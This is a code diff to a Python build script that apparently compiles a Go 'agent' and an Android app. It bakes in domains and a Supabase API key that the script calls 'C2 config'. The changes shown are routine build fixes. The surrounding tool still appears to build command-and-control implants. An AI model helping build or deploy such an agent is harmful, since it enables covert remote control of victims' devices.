@@ -212,6 +212,11 @@ def compile_agent(domain1, domain2, apikey, arch="arm64"):
     with open(patched_src, "w") as f:
         f.write(source)
 
+    # Copy all other .go files in the agent directory (e.g. CGO wrappers)
+    for fname in os.listdir(AGENT_DIR):
+        if fname.endswith(".go") and fname != "main.go":
+            shutil.copy2(os.path.join(AGENT_DIR, fname), os.path.join(tmpdir, fname))
+
     # Copy go.mod
     if os.path.exists(AGENT_MOD):
         shutil.copy2(AGENT_MOD, os.path.join(tmpdir, "go.mod"))
@@ -324,9 +329,9 @@ def _find_gradle_cmd():
     system_gradle = shutil.which("gradle")
     if system_gradle:
         log("gradlew not found, generating wrapper with system Gradle...", "WARN")
-        # Use --gradle-version 8.5 to match AGP 8.2.0 compatibility
+        # Use --gradle-version 8.14 for JDK 21-23 compatibility
         # Without this, system Gradle overwrites gradle-wrapper.properties with its own version
-        run(f'"{system_gradle}" wrapper --gradle-version 8.5', cwd=ANDROID_DIR, check=False)
+        run(f'"{system_gradle}" wrapper --gradle-version 8.14', cwd=ANDROID_DIR, check=False)
         if os.path.exists(wrapper):
             if not IS_WIN:
                 os.chmod(wrapper, 0o755)
@@ -494,10 +499,11 @@ def main():
 
     domain1 = args.domain or config.get("VITE_SUPABASE_URL", "").replace("https://", "").rstrip("/")
     domain2 = args.domain2 or config.get("VITE_SUPABASE_URL_2", "").replace("https://", "").rstrip("/")
-    # Support both key names (setup.py writes PUBLISHABLE_KEY, some configs use ANON_KEY)
+    # Prefer the JWT anon key (required by PostgREST API).
+    # PUBLISHABLE_KEY is for the Supabase JS client and won't authenticate REST calls.
     apikey = (args.apikey
-              or config.get("VITE_SUPABASE_PUBLISHABLE_KEY", "")
-              or config.get("VITE_SUPABASE_ANON_KEY", ""))
+              or config.get("VITE_SUPABASE_ANON_KEY", "")
+              or config.get("VITE_SUPABASE_PUBLISHABLE_KEY", ""))
 
     if not domain1 or not apikey:
         log("C2 config required. Set values in .env or use --domain/--apikey flags.", "ERR")
